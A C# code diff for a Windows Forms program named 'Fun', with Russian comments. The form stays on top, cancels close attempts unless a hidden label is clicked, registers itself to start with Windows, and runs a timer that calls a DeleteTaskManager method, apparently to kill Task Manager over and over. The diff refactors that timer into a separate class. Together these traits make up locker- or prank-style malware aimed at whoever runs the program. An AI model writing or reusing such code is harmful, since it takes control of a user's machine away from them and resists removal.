@@ -13,21 +13,13 @@ namespace Fun
 {
     public partial class Form1 : Form
     {
+        private bool safeExitter = false;//позволяет нам закрыть программу
         public Form1()
         {
             InitializeComponent();
             this.TopMost = true;
             this.MinimizeBox=false;
-        }
-        private Timer timer;
-        private bool safeExitter = false;
-        private void Timer()
-        {
-            timer = new Timer();
-            timer.Interval = 500;//каждую секунду
-            timer.Tick +=DeleteTaskManager ;
-            timer.Start();
-        }
+        }                 
         private void DeleteTaskManager(object sender,EventArgs e)
         {
             try
@@ -63,26 +55,21 @@ namespace Fun
             {
                 e.Cancel = true;
             }
-        }
-
-        
-
+        }      
         private void Form1_Load(object sender, EventArgs e)
         {
-            Timer();
+            Timerr timerr=new Timerr(DeleteTaskManager);
+            timerr.StartTimer();
             AutoStartup autoStartup = new AutoStartup();
             autoStartup.SetStartup(true);
            // this.ShowInTaskbar = false;
         }
-
         private void label2_Click(object sender, EventArgs e)
         {
             AutoStartup autoStartup = new AutoStartup();
             autoStartup.SetStartup(false);
             safeExitter = true;
             Application.Exit();
-        }
-
-       
+        }       
     }
 }
